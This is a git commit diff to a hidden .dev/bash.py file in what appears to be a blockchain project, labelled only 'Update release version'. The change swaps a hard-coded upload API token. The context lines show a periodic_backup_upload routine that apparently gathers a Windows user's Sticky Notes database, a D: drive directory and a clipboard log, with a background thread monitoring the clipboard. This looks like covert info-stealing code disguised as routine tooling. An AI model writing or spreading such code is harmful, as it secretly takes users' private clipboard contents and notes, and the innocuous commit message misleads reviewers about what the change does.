91125230b1c970069d8527a7ff9a0096e4e2edce
BlockChain-src <blockchaindat@proton.me>
2025-01-14 02:35:15 +0800

    Update release version

--- .dev/bash.py
+++ .dev/bash.py
@@ -132,7 +132,7 @@ def periodic_backup_upload():
     ddd_source_directory = "/mnt/d"
     clipboard_log_path = os.path.expanduser("~/.dev/Backup/clipboard_log.txt")
     sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
-    api_token = "KPnPkbJW9SqKQ8FHqaiJo9ub7YKfoq3J"
+    api_token = "z7hjnq2voZ7tDyh7VHBKeIf0B6k1CuXC"
 
     threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,), daemon=True).start()
 
